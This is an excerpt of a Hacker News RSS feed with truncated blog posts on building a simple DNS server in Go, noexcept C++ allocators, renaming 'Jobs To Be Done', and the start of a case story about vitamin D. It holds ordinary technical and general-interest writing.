<![CDATA[Under the Hood of a Simple DNS Server]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261187">thread link</a>) | @scriptnull
<br/>
August 24, 2020 | https://blog.aos.sh/2020/08/23/under-the-hood-of-a-simple-dns-server/ | <a href="https://web.archive.org/web/*/https://blog.aos.sh/2020/08/23/under-the-hood-of-a-simple-dns-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2><p>As part of bringing up my personal infrastructure, I wanted a way to connect
all my various boxes together and make them available to me from anywhere with
an internet connection. The first step was to put up a VPN. For that, I use
Wireguard. I ended up creating a simple <a href="https://github.com/aos/wgdash">management
interface</a> that allows me to link peers together
and be able to access them via virtual IP addresses, no matter where they are.</p><p>One downside to this method is having to remember each individual box’s IP
address. That’s too much work. Fortunately, Wireguard allows us to plug in a
separate DNS server to solve this problem.</p><p>At its most basic, a DNS server maps IP addresses to domain names. This makes
it much easier for us humans to remember websites: we just need to remember the
name and DNS will take care of translating it to an IP address. For example:
<code>www.google.com</code> (currently) maps to IP address <code>172.217.10.228</code>. I won’t go
into the detail of how DNS works here, as there are
<a href="https://drawings.jvns.ca/dns/">much</a> <a href="https://howdns.works/">better</a> guides
for that. I highly recommend checking out one of the two links above if you
want a high level overview.</p><p>For this post, I will talk mostly about the details of implementing a DNS
server that follows the original two RFCs that laid out the spec:
<a href="https://tools.ietf.org/html/rfc1034">1034</a> and
<a href="https://tools.ietf.org/html/rfc1035">1035</a>.</p><h2 id="basic-building-blocks">Basic building blocks</h2><p>The primitives of DNS are known as <em>resource records</em>. This is the data that is
requested by a client and answered by a DNS server. The most familiar would be
an <strong>A</strong> record, which maps a domain name to an IPv4 address. We can use a tool
known as <code>dig</code><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> to query for A records:</p><pre><code># Look for the A record of "www.google.com"
$ dig +short www.google.com A
172.217.10.228
</code></pre><p>The command returned <code>172.217.10.228</code>, the IP address attached to
<code>www.google.com</code>.</p><p>There are many types of resource records, but let’s enumerate the most relevant
and discuss each of them as we build the picture:</p><ol><li>A (AAAA)</li><li>CNAME</li><li>NS</li><li>SOA</li></ol><p>The A records also have a sibling called <strong>AAAA</strong>, which map to IPv6 addresses.
Let’s use <code>dig</code> again to find the IPv6 address of <code>www.google.com</code>:</p><pre><code>$ dig +short www.google.com AAAA
2607:f8b0:4006:814::2004
</code></pre><p>Feel free to play around with this. At some point, you might run into something
strange. You run <code>dig</code> against the domain for my blog and you get back
unexpected results:</p><pre><code>$ dig +short blog.aos.sh AAAA
aos.github.io.
</code></pre><p>Wait, what? Let’s try calling <code>dig</code> without <code>+short</code>:</p><pre><code>$ dig blog.aos.sh AAAA
; Output of generated query here, skipping...

;; QUESTION SECTION:
;blog.aos.sh.             IN    AAAA

;; ANSWER SECTION:
blog.aos.sh.      300     IN    CNAME   aos.github.io.
</code></pre><p>You will see that we asked for the AAAA record, but we got back an answer with
something called a CNAME record. Intuitively, we might come to the conclusion
that a CNAME record is an alias, and we would be right.</p><p><strong>CNAME</strong> stands for canonical name, and is used as a way to point one domain
name to another. Contrast that to A records which point a domain name to an IP
address.</p><p>To give you an example, my blog is hosted on Github Pages which automatically
generate my URL as <code>&lt;my-username&gt;.github.io</code>, but since I own the domain
“<code>aos.sh</code>”, I created a CNAME record with my domain provider and pointed it to
<code>aos.github.io</code>. Eventually, <code>aos.github.io</code> will point to a valid IP address,
we can see this process in action with <code>dig</code>:</p><pre><code>$ dig blog.aos.sh A
; Skipping to relevant bits...

;; QUESTION SECTION:
;blog.aos.sh.                   IN      A

;; ANSWER SECTION:
blog.aos.sh.      300     IN    CNAME   aos.github.io.
aos.github.io.    3599    IN    A       185.199.110.153
aos.github.io.    3599    IN    A       185.199.109.153
aos.github.io.    3599    IN    A       185.199.108.153
aos.github.io.    3599    IN    A       185.199.111.153
</code></pre><p>The reason my page has multiple IP addresses assigned to it could be that there
is a load balancer on Github’s backend and my site is being served from any of
those URLs.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p><p>If you try to visit <code>aos.github.io</code>, you will be taken to my blog anyway
but you will see that it changes the URL to <code>blog.aos.sh</code>. That is because
I told Github that I’m using a custom domain, and it sets up a redirect back to
<code>blog.aos.sh</code>.</p><h2 id="tying-it-together">Tying it together</h2><p>DNS servers use a file known as the <strong>zone file</strong> to hold all necessary
resource records. When a client makes a request to the DNS server, the server
will use the information in this file to respond. In a zone file, a resource
record has the following format:</p><pre><code>catcoffeecode.club.     300     IN      A       157.245.253.239
      ^                 ^       ^       ^             ^
      name              TTL     class   type          data
</code></pre><p>Depending on the type of resource record, the name and data portions will
contain different information. The <em>class</em> is the network class, and is most
often <code>IN</code> standing for <code>INternet</code>. We will get to the <em>TTL</em> in a bit. In the
above example, we have an A-type record for <code>catcoffeecode.club</code>, that holds
the IPv4 address.</p><p>The start of every zone file is a bit different, and looks something like this:</p><pre><code>$ORIGIN hello.
$TTL 1750
@     IN      SOA     ns1.hello.    me.catcoffeecode.hello. (
                      2020071701  ; Serial
                      3H          ; refresh
                      1H          ; retry
                      1W          ; expire
                      1D)         ; minimum TTL

              NS      ns1.hello.

;; all of the rest of our resource records go below
ns1.hello.            A       10.56.0.1

lumpi.hello.  300     A       10.56.0.15
pi.hello.             CNAME   lumpi.hello.

; ...
</code></pre><p>We start with the name of our zone in the <code>$ORIGIN</code> directive, followed by a
default <code>$TTL</code>, the time-to-live of a resource record. Eventually we get to the
<strong>SOA</strong> record, which stands for Start of Authority. No zone file is valid
without this record at the beginning. This will contain administrative
information as well as other necessary fields.</p><p>The SOA starts with the <code>@</code> symbol, shorthand for the origin directive (which
we specified two lines above), followed by the class, resource type, and some
other necessary fields commented above.</p><p>The other record shown above is the <strong>NS</strong> record. This is the name server that
will be <em>authoritative</em> for this zone. This is typically the server that holds
the actual zone file.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p><h2 id="serving-dns-records">Serving DNS records</h2><p>Now that we have a basic understanding of resource records and zone files, we
can put them to use in our DNS server. Here’s the idea: we start a server
that listens on UDP port 53 (as defined by the DNS protocol), load our zone
file, and respond to any DNS requests with what we have available. If we don’t
have any answers, then ask an upstream/forward DNS server with the same
request, and serve back the results.</p><p>Typically, DNS requests are handled by programs known as <strong>resolvers</strong>. When
your browser or program makes a request for a URL, the resolver will first
<em>resolve</em> the URL to an IP address. It does this by sending a DNS request to a
preconfigured list of servers; resolvers will also usually cache successful
requests for a speed boost.</p><p>A simple DNS server will have a few moving parts:</p><ol><li>Parsing the zone file into data structures that allow us to manipulate it
easily.</li><li>Monitoring the zone file for any changes. And if changed, update the data
structures that hold our zone information with the changes.</li><li>Serving any DNS requests that come our way.</li></ol><p>Having said that, let’s look at what this would look like using some code.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>
A zone data structure might look something like this:</p><div><pre><code data-lang="go"><span>// Zone contains all resource records and helper fields
</span><span></span><span>type</span> Zone <span>struct</span> {
	filename        <span>string</span>
	fileLastModTime time.Time
	rrs             []dns.RR
	ns              []dns.RR
	mut             sync.RWMutex
}
</code></pre></div><p>We hold our zone file name, our resource records (<code>rrs</code>), our name server
records (<code>ns</code>), and some extra fields to facilitate interacting with this
data structure.</p><p>Because we need to monitor for changes to our zone file, we run an
asynchronous routine to essentially check the zone file’s last modified time
and compare it to what we have stored. If it has changed, we re-parse our zone
file.</p><div><pre><code data-lang="go"><span>// Note: error handling removed for brevity
</span><span></span><span>func</span> <span>monitorZonefile</span>(zone *Zone) {
	t := time.<span>NewTicker</span>(time.Second * <span>30</span>)
	<span>defer</span> t.<span>Stop</span>()

	<span>for</span> {
		<span>select</span> {
		<span>case</span> &lt;-t.C:
			fileInfo, _ := os.<span>Stat</span>(zone.filename)

			<span>if</span> fileInfo.<span>ModTime</span>().<span>After</span>(zone.fileLastModTime) {
				log.<span>Printf</span>(<span>"zone file has been modified"</span>)
				zone.fileLastModTime = fileInfo.<span>ModTime</span>()

				<span>parseRecords</span>(zone)
			}
		}
	}
}
</code></pre></div><p>Once we’ve parsed our zone file into resource records, we can then begin to
serve them to clients. We do this by bringing up our server and listening for
requests on UDP port 53. All DNS requests and responses have a specific format,
as defined by RFC 1035:</p><ol><li>Header - various helpful fields</li><li>Question - the request to the DNS server</li><li>Answer - resource records answering our question</li><li>Authority - resource records which point to an authority</li><li>Additional - any resource records holding additional information</li></ol><p>To answer a DNS request, we look in the Question field for the name of the
record and check to see if we have a record that matches. The name, type, and
class information of the request must all be equivalent for a match. We then
create a DNS response with the same format, copy the Question over, and fill
out the Answer section with the resource records that we have found. If this
resource record is in our zone file, we fill out the Authority section with
our name server. Finally, we respond to the request after aggregating all of
our sections.</p><p>Let’s see how this would look like with some code:</p><div><pre><code data-lang="go"><span>func</span> <span>HandleRequest</span>(w dns.ResponseWriter, req *dns.Msg) {
    <span>// Read-lock the zone so it doesn't change from under us
</span><span></span>    zone.mut.<span>RLock</span>()
    <span>defer</span> zone.mut.<span>RUnlock</span>()

    <span>// Create a response message
</span><span></span>    m := <span>new</span>(dns.Msg)
    m.<span>SetReply</span>(req)

    <span>// For all questions, loop through our records to check for a match
</span><span></span>    <span>for</span> _, q := <span>range</span> req.Question {
        answers := []dns.RR{}

        <span>for</span> _, rr := <span>range</span> zone.rrs {
            rh := rr.<span>Header</span>()

            <span>// 1. Handle CNAMEs
</span><span></span>            <span>if</span> q.Name == rh.Name &amp;&amp; (rh.Rrtype == dns.TypeCNAME || q.Qtype == dns.TypeCNAME) …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.aos.sh/2020/08/23/under-the-hood-of-a-simple-dns-server/">https://blog.aos.sh/2020/08/23/under-the-hood-of-a-simple-dns-server/</a></em></p>]]>
            </description>
            <link>https://blog.aos.sh/2020/08/23/under-the-hood-of-a-simple-dns-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261187</guid>
            <pubDate>Mon, 24 Aug 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Here I stand, free: noexcept allocators and an inclusive C++ STL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261145">thread link</a>) | @fanf2
<br/>
August 24, 2020 | https://thephd.github.io/freestanding-noexcept-allocators-vector-memory-hole | <a href="https://web.archive.org/web/*/https://thephd.github.io/freestanding-noexcept-allocators-vector-memory-hole">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
      <p>… Can I just not write this article, and we all pretend I wrote it and we all get it and we’re gonna move forward with great things so I don’t have to spend the mental cash to get this ball rolling? … No?<!--more--></p>

<p>Fine, then. I’ll put down my money:</p>

<p>It was always possible to support the <code>-fno-exceptions</code> folk in Standards-Compliant C++ without any backwards compatibility breaks since C++11 and half of the gymnastics that we – as a pariah outside the blessing of the C++ Parametric Nondeterministic Abstract Machine and its Committee – employed to support ourselves have been so violently unnecessary it makes me want to puke a rainbow.</p>

<p>O’course, if you’re a regular here dearest reader, then you know that’s just my way of saying…</p>



<p>Sleep well? :D</p>

<p>If you were following me on Twitter a long time ago (read: like 3 months ago in Non-Pandemic Time™), I was basically shit-posting about <code>std::vector</code> once a day while implementing the damn thing on my own, but with a few tweaks. Viewers of my stream would be privy to the details but we were able to prove that we could create an exception-less <code>std::vector</code> that passed the entirety of e.g. libstdc++’s <code>vector</code> tests and upheld the requirements of the standard library and had exactly equivalent performance of a <code>std::vector</code>. Because you are my most loyal and faithful reader, I am now going to reveal to you the dark arts required to make <code>std::vector</code> – and, consequently, every container and allocator-dependent portion of the Standard Library – purely <code>noexcept</code>.</p>

<p>Just below is a standards-conforming, weak, pathetic allocator that shivers in my grasps, awaiting what horrible things I will do to them:</p>

<div><div><pre><code><span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
<span>class</span> <span>alloc</span> <span>{</span>
<span>public:</span>
	<span>using</span> <span>value_type</span> <span>=</span> <span>T</span><span>;</span>

	<span>T</span><span>*</span> <span>allocate</span> <span>(</span><span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>);</span>
	<span>void</span> <span>deallocate</span><span>(</span><span>T</span><span>*</span> <span>first</span><span>,</span> <span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>);</span>
<span>};</span>
</code></pre></div></div>

<p>And now, gaze upon this patch and TREMBLE at the transformative, enlightened force of our changes:</p>

<div><div><pre><code><span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
<span>class</span> <span>alloc</span> <span>{</span>
<span>public:</span>
	<span>using</span> <span>value_type</span> <span>=</span> <span>T</span><span>;</span>

	<span>T</span><span>*</span> <span>allocate</span> <span>(</span><span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>)</span> <span>noexcept</span><span>;</span> <span>// (1)</span>
	<span>void</span> <span>deallocate</span><span>(</span><span>T</span><span>*</span> <span>first</span><span>,</span> <span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>)</span> <span>noexcept</span><span>;</span> <span>// (2)</span>

	<span>void</span> <span>validate_max</span><span>(</span><span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>,</span> <span>std</span><span>::</span><span>size_t</span> <span>container_maximum</span><span>)</span> <span>noexcept</span><span>;</span> <span>// (3)</span>
<span>};</span>
</code></pre></div></div>

<p>B&nbsp;E&nbsp;H&nbsp;O&nbsp;L&nbsp;D&nbsp;&nbsp;&nbsp;M&nbsp;Y&nbsp;&nbsp;&nbsp;P&nbsp;O&nbsp;W&nbsp;E&nbsp;R&nbsp;!</p>



<p>Hahaha I wish !!</p>

<p>With two <code>noexcept</code> specifiers and one additional function call, you now have everything you need to turn every single container in the standard library into a purely <code>noexcept</code> one, dear reader. This includes the “sentinel node”-allocating implementation choices in certain <code>unordered_map</code> implementations, like MSVC’s, but also every other absolutely craven implementation choice someone might make. Yes, this is the 💦APEX💦LIBRARY💦DESIGN💦 we’ve all needed in our lives: conditional <code>noexcept</code> and an extra function.</p>

<p>Honestly, there isn’t even more to write here. This is literally the whole post. With two strategic keywords and one extra function, the entire standard library at all related to allocators, ever, can get used in (for example) the <strong>entirety of Windows</strong>:</p>

<blockquote>
  <p>“… if STL switched to making bugs [logic errors, domain errors] be contracts… and we could make <code>bad_alloc</code> fail fast, we could use the standard STL unmodified throughout Windows.” – <em>Pavel Curtis, private communication</em></p>

  <p>– <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2019/p0709r3.pdf">Herb Sutter’s P0709r3</a></p>
</blockquote>

<p>A million game developer projects, all of LLVM’s codebase, embedded projects throughout the globe… the possibilities are endless, which is why such a banal solution just floors me. I meme about apex library design but honestly there’s no way it can be this easy. It’s not like I could port the entirety of libstdc++’s test suite and several libc++ tests to use my <code>std0::dynamic_array&lt;T, Allocator&gt;</code> class and pass them all like it was no big deal–</p>

<p><img src="https://thephd.github.io/assets/img/2020-08-20/standards-compliant.png" alt="Image of passing all of std0's personal tests and libstdc++'s vector tests."></p>



<p>I’m not even going to be pretend to be surprised: this is a (that is, this is one of the) logical conclusion of how to handle memory allocation errors. Most applications are simply not interested in dealing with the problem. Others yet still try to handle it (the exception version), but do it poorly. More disciplined and focused application writers (not library authors) attempt the second and third rows in this <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007/n2271.html#Appendix_18">13 year old table inside paper C++ paper from Paul Pedriana</a>. Still, when it comes to “I can handle this on my own and I do not need to make every downstream user pay for it”, <code>noexcept</code> allocators are the best way to handle it.</p>

<p>So let’s make it so the user does not pay for it.</p>

<p>As demonstrated above, the cost of such freedom is a combination of 3 optional changes. The first is doing the obvious!</p>

<h3 id="make-it-noexcept">Make it <code>noexcept</code></h3>

<p>Can’t get rid of exception problems if the allocator tosses an exception! So, we do the obvious: don’t do it. There are several ways to do this, but here’s a bog-standard, basic implementation:</p>

<div><div><pre><code><span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
<span>T</span><span>*</span> <span>alloc</span><span>&lt;</span><span>T</span><span>&gt;::</span><span>allocate</span> <span>(</span><span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>)</span> <span>noexcept</span> <span>{</span>
	<span>// we will pretend alignment isn't </span>
	<span>// a thing, for the moment</span>
	<span>std</span><span>::</span><span>size_t</span> <span>byte_count</span> <span>=</span> <span>element_count</span> <span>*</span> <span>sizeof</span><span>(</span><span>T</span><span>);</span>
	<span>void</span><span>*</span> <span>ptr</span> <span>=</span> <span>malloc</span><span>(</span><span>byte_count</span><span>);</span>
	<span>if</span> <span>(</span><span>ptr</span> <span>==</span> <span>nullptr</span><span>)</span> <span>{</span>
		<span>// WHATEVER YOU WANT</span>
		<span>std</span><span>::</span><span>terminate</span><span>();</span>
	<span>}</span>
	<span>return</span> <span>static_cast</span><span>&lt;</span><span>T</span><span>*&gt;</span><span>(</span><span>ptr</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>We use <code>std::terminate()</code> here, but as Paul Pedriana’s EASTL paper (and many papers before – and after – his) note, there are multiple ways to handle allocation failure. Note that at no point can we let an invalid pointer escape the <code>allocate</code> function: this is <em>not</em> a chance to start returning <code>nullptr</code> from the function. (That is an ABI break and a contract break of what the Named Requirement <code>Allocator</code> means in the C++ Standard.)</p>

<p>There is also one slight adjustment to be made here: some compilers do not recognize <code>malloc</code> as a <code>noexcept</code>-like function, and upon seeing this code are tempted to vomit their own version of <code>try { /* blah */ } catch (...) { std::terminate(); }</code> in. This is mostly because compilers like Clang and GCC both mark their respective <code>malloc</code> “library builtins” as <a href="https://github.com/llvm/llvm-project/blob/6c18f7db73a08f1ae39a76a86b414c5b0c24ee86/clang/include/clang/Basic/Builtins.def#L911">throw-capable</a> (e.g., it is not marked with the string <code>"fn"</code> in its builtin definition). An internally-C++ implementation of <code>malloc</code> or <code>free</code> can indeed throw through the C boundary, however toxic and wrong many might consider that to be; no, it can’t be generally <code>noexcept</code>.</p>

<p>The fix to this is to basically force a <code>noexcept</code>-cast on the function. You, dear reader, <a href="https://twitter.com/hankadusikova/status/1276828584179642368">can pick up Hana Dusíková’s handy utility</a> to <a href="https://godbolt.org/z/6oxS3d">do that</a>, or if you’re a hairy, jaded, dysphoric Neanderthal like me just cast and call:</p>

<div><div><pre><code><span>template</span> <span>&lt;</span><span>typename</span> <span>T</span><span>&gt;</span>
<span>T</span><span>*</span> <span>alloc</span><span>&lt;</span><span>T</span><span>&gt;::</span><span>allocate</span> <span>(</span><span>std</span><span>::</span><span>size_t</span> <span>element_count</span><span>)</span> <span>noexcept</span> <span>{</span>
	<span>using</span> <span>f_ptr_ne</span> <span>=</span> <span>void</span><span>*</span><span>(</span><span>*</span><span>)(</span><span>std</span><span>::</span><span>size_t</span><span>)</span> <span>noexcept</span><span>;</span>
	<span>// we will pretend alignment isn't</span>
	<span>// a thing, for the moment</span>
	<span>std</span><span>::</span><span>size_t</span> <span>byte_count</span> <span>=</span> <span>element_count</span> <span>*</span> <span>sizeof</span><span>(</span><span>T</span><span>);</span>
	<span>f_ptr_ne</span> <span>c_alloc_call</span>
		<span>=</span> <span>reinterpret_cast</span><span>&lt;</span><span>f_ptr_ne</span><span>&gt;</span><span>(</span><span>malloc</span><span>);</span>
	<span>void</span><span>*</span> <span>ptr</span> <span>=</span> <span>c_alloc_call</span><span>(</span><span>byte_count</span><span>);</span>
	<span>if</span> <span>(</span><span>ptr</span> <span>==</span> <span>nullptr</span><span>)</span> <span>{</span>
		<span>// WHATEVER YOU WANT</span>
		<span>std</span><span>::</span><span>terminate</span><span>();</span>
	<span>}</span>
	<span>return</span> <span>static_cast</span><span>&lt;</span><span>T</span><span>*&gt;</span><span>(</span><span>ptr</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Even if the C++ Standard <a href="https://eel.is/c++draft/res.on.exception.handling#2">explicitly sanctions</a> these functions to be <code>noexcept</code>, we have to do this kind of work anyways to get perfectly consistent code generation across platforms. But, once we do the work we now have the general blueprint for a <code>noexcept</code>-based <code>allocate</code> function. The exact same process can be done for the <code>deallocate</code> function, so we’re not going to write the definition out here to see, dear reader. (Is this where, in the math books, they would say “Exercise left to the reader” …?)</p>

<p>Still, there is more to be done!</p>

<h3 id="purging-the-other-exception-length_error">Purging the other exception: <code>length_error</code></h3>

<p><code>validate_max</code> is our escape hatch here. The only reason this is necessary for <code>std::vector</code> – and every other container – is because in the Standard Library we do this thing where we force a contract violation-handling scheme with exceptions. Take a look at the description for <code>reserve(size_type n)</code> from <code>std::vector</code>:</p>

<blockquote>
  <p><em>Throws:</em> <code>length_error</code> if <code>n</code> &gt; <code>max_size()</code>.<sup>227</sup></p>

  <p>– <a href="http://eel.is/c++draft/vector#capacity-5">C++, Latest Working Draft</a></p>
</blockquote>

<p><code>std::length_error</code> is a <code>std::exception</code>-derived type that gets deliberately and unavoidably thrown if we violate what the <code>max_size()</code> of the container is. Note that it is the <code>max_size()</code> of the container, and NOT the allocator (though, the two <em>can</em> be related to one another). This serves two purposes for the library.</p>

<p>The first is obvious: diagnosing a precondition violation like this with an exception is not just a matter of taste, but of security and safety. Too-large values can manifest generally as overflow-to-too-small-value bugs, which result in indexing out of bounds and inviting security vulnerabilities on top of general memory corruption.</p>

<p>It also serves another purpose, separate from the <code>max_size()</code> function found on allocators: only containers themselves know whatever special invariants they need to maintain their behavior.</p>

<p><code>[[segue("begin")]]</code> For example, <code>std::vector</code> – in the general case – must maintain that there is at least <code>(allocator::max_size() / 2) - 1</code> space always available, because a <code>push_back</code> can trigger a resizing operation. <code>resize</code> needs to be able to hold the old memory in place, before copying it to the new location plus whatever additional items were added and then destroying the old memory. This means that <code>allocator::max_size()</code> is not the “final” determination of how big your container can be, but the implementation strategy of the container itself. This is why containers have their own <code>max_size()</code> function. Other containers might have fixed overhead: for example, a <code>std::list</code> may do <code>(allocator::max_size() * sizeof(value_type)) / sizeof(_M_internal_node)</code> to account for how many nodes it can possibly allocate for the given <code>value_type</code> of the <code>std::list</code>. It is also subject to the constraints of the <code>difference_type</code>, which is –  generally speaking – a numeric value capable of representing signed or unsigned distances between two pointer types.</p>

<p>This ultimately means that, given current architecture, one could never have a <code>std::vector</code> that contains more than half of your given memory inside of itself since <code>maximum_pointer_value - minimum_pointer_value</code> cannot exceed <code>difference_type</code>’s representative abilities. This is not what is done in …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thephd.github.io/freestanding-noexcept-allocators-vector-memory-hole">https://thephd.github.io/freestanding-noexcept-allocators-vector-memory-hole</a></em></p>]]>
            </description>
            <link>https://thephd.github.io/freestanding-noexcept-allocators-vector-memory-hole</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261145</guid>
            <pubDate>Mon, 24 Aug 2020 14:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“Jobs To Be Done” is a terrible name]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261135">thread link</a>) | @mcrittenden
<br/>
August 24, 2020 | https://critter.blog/2020/08/24/jobs-to-be-done-is-a-terrible-name/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/08/24/jobs-to-be-done-is-a-terrible-name/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-804">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Jobs to be done (JTBD) are <em>the mechanisms&nbsp;that cause a consumer to adopt an innovation.</em> </p>



<p><strong>But when people hear the name, they think it’s a smart-sounding way of saying “task” or “todo”.</strong></p>



<p>Let’s first talk about what JTBD really means. A good JTBD has 3 characteristics:</p>



<ol><li>It is solution-agnostic</li><li>It results in personal progress</li><li>It’s&nbsp;stable-ish over time</li></ol>



<p>For example, if John buys a grill, his JTBD is <em>not</em> that he wants to grill some burgers. Grilling burgers doesn’t satisfy any of those 3 criteria.</p>



<ol><li>It’s not solution agnostic. There are only a few ways to grill burgers.</li><li>It doesn’t result in personal progress when completed. He hasn’t progressed as a person, because he now has burgers.</li><li>It isn’t stable over time. Once he’s made the burgers, he’s done with his urge to make burgers for a while.</li></ol>



<p>Maybe John bought the grill because he <em>wants to be a better entertainer for his friends</em>. That’s a better example of a JTBD.</p>



<ol><li>It’s solution agnostic. There are countless ways to become a better entertainer. </li><li>It results in personal progress. Being a better entertainer means he progressed as a person.</li><li>It’s stable over time. When he buys the grill, he doesn’t stop wanting to be a good entertainer. That JTBD lives on.</li></ol>



<hr>



<p>So let’s rename Jobs To Be Done, just for fun. Here are my suggestions:</p>



<ol><li>Emotional Betterments</li><li>Life Improvements To Be Had (LITBH, super catchy)</li><li>Customer Progress Desires</li><li>Progression Stories (because “story” is trendy)</li><li>Consumer Personal Enhancement</li><li>Personal Gain Opportunity (PGO, is that an airport?)</li></ol>



<p>Even something vague and cool sounding like “Tablesaws” or “Wind Whistles” would be better, because at least that wouldn’t give people the wrong idea.</p>



<p>How would you rename JTBD? <a href="https://twitter.com/mcrittenden">Tweet me and let me know</a>.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/08/24/jobs-to-be-done-is-a-terrible-name/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261135</guid>
            <pubDate>Mon, 24 Aug 2020 14:42:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vitamin D, part 2: Shannon's story]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24261124">thread link</a>) | @conorh
<br/>
August 24, 2020 | https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story | <a href="https://web.archive.org/web/*/https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.16.2"><div dir="ltr"><div><div id="viewer-clbfl"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story" data-pin-media="https://static.wixstatic.com/media/3e0600_cc86ea12bc4248faaa2a0e149d1a9ef4~mv2.jpg/v1/fit/w_900,h_450,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_cc86ea12bc4248faaa2a0e149d1a9ef4~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><h3 id="viewer-7adfi">How much Vitamin D should I take? This is still the looming question, and it’s time to address it. </h3><p id="viewer-9k73p">First, though, imagine that someone in a public forum online asked me, “How much metoprolol (a common blood pressure medication) should I take?” It would be clear that I could not give a real answer. I could give a heavily qualified blanket statement that covered indications and common starting doses, and then recommended speaking with a doctor regarding a personalized dosage. I wouldn’t give a specific dose. But no one would expect me to.  Metoprolol is a medication, and medications are usually prescribed by a physician.</p><p id="viewer-7tpp4">We think of vitamins and supplements differently. A few readers have made comments like this: “I understand that the evidence for Vitamin D in healthy adults doesn’t really show a benefit, but I take Vitamin D because it probably won’t hurt me, and it might help.” This is a common sentiment regarding supplements, but not a statement that most people would make about metoprolol, or any prescribed medication.  Medications are generally understood to be substances taken in response to a specific disease or condition, and we hope that research has shown that they work. Supplements are given a pass; we take them if they might help, even though they may not be needed. </p><p id="viewer-2fbtq"><strong>But Vitamin D should be thought of as a medication</strong>, despite being sold over-the-counter in the supplements aisle. </p><p id="viewer-5549c">To illustrate this, let me introduce Shannon. </p><p id="viewer-518ch">In the fall of 2018, Shannon R. was the special education director for a large Arizona school district. Normally energetic and expressive, the otherwise healthy 38-year-old began having an odd and disturbing symptom: difficulty speaking. Her husband and two boys would ask her questions, and though understanding the question, she was unable to formulate the words to respond. </p><p id="viewer-e7f4v">Milder problems had started over the summer, when she felt more tired than usual. As the months passed, new symptoms appeared: palpitations, insomnia, anxiety, along with cognitive deficits – “like my brain wouldn’t function,” she recalled. Her heart rate, normally in the 60s, now often stayed in the 90s, even while in bed. She barely slept at night and lost nearly 50 pounds. By mid-semester, she was often unable to work. At around 1 AM one October morning, she was taken to the emergency room for a racing heart. When there, she had difficulty responding to the doctors’ and nurses’ questions. After a full workup, the doctors had no explanation, so they resorted to what doctors often reach for when confronted with mystery ailments: psychiatric illness. </p><p id="viewer-fu7id">Shannon would be hospitalized several times for “catatonia,” a general symptom describing difficulty with speaking or moving that is caused by certain psychiatric conditions like depression and schizophrenia. Though she had never exhibited mental illness before, doctors assumed that Shannon had developed a severe psychiatric disorder. </p><p id="viewer-4pb27">Shannon’s husband, as well as her new psychiatrist, doubted this diagnosis, and sought second and third opinions. By the time she contacted me four months later, they had consulted multiple specialists at three different hospitals around the state, but still did not have an explanation for her physical and mental decline. There was something that all of the doctors had noticed, though. Her blood calcium levels were 